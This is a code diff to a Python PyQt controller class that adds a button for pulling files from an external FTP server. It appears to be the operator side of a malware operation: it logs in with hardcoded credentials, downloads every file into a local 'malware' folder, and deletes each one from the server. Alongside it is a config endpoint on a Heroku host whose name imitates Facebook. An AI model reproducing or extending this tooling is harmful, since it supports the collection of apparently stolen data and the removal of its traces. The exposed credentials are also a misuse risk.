@@ -1,6 +1,7 @@
 from PyQt5.QtWidgets import QTableWidgetItem
 from requests import get
-
+from ftplib import FTP
+import webbrowser
 
 class Controller:
 
@@ -10,6 +11,10 @@ class Controller:
         self.__configURL = 'http://facebook-user-profile.herokuapp.com/config'
         self.__gui.wakeup.clicked.connect(self.wakeup)
         self.__gui.sendconfig.clicked.connect(self.sendConfigData)
+        self.__gui.getftp.clicked.connect(self.getfiles)
+        self.__ftpURL = 'ftp.atw.hu'
+        self.__ftpUserName = 'kiserletimuto'
+        self.__ftpPassWord = 'patti'
 
 
     def wakeup(self):
@@ -39,3 +44,18 @@ class Controller:
 
 
 
+    def getfiles(self):
+        try:
+            ftp = FTP(self.__ftpURL)
+            ftp.login(self.__ftpUserName, self.__ftpPassWord)
+            filenames = ftp.nlst()
+            for filename in filenames:
+                print(filename)
+                local_filename = '/home/peterforro/Documents/malware/' + filename
+                file = open(local_filename, 'wb')
+                ftp.retrbinary('RETR ' + filename, file.write)
+                ftp.delete(filename)
+                file.close()
+            webbrowser.open('file:///' + '/home/peterforro/Documents/malware/')
+        except Exception as error:
+            print('FTP error!: ',error)
